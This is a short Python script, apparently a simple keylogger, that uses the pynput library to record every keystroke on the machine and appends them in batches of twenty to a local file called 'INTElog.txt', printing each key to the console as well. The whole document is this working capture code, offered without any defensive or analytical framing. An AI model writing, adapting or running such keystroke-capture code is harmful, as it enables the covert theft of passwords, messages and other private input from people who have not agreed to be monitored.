import os.path
from os import path
from pynput.keyboard import Key, Listener

keys = []
count = 0
MAX_COUNT=20

def press(key):
    global keys, count

    if key != Key.space:
        keys.append(key)
    else:
        keys.append(" ")
    count = count + 1
    print(count)
    if count == MAX_COUNT:
        count = 0
        writer(keys)
        keys = []
    print("Key pressed {}".format(key))


def release(key):
    pass

def writer(log):
    mode = "w"
    if path.exists("INTElog.txt"):
        mode="a"
    with open("INTElog.txt", mode) as file:
        for i,key in enumerate(log):
            if str(key)== "Key.enter" or str(key)=="Key.space" :
                key="\n"
            file.write(str(key))



with Listener(on_press=press, on_release=release) as listener:
    listener.join()
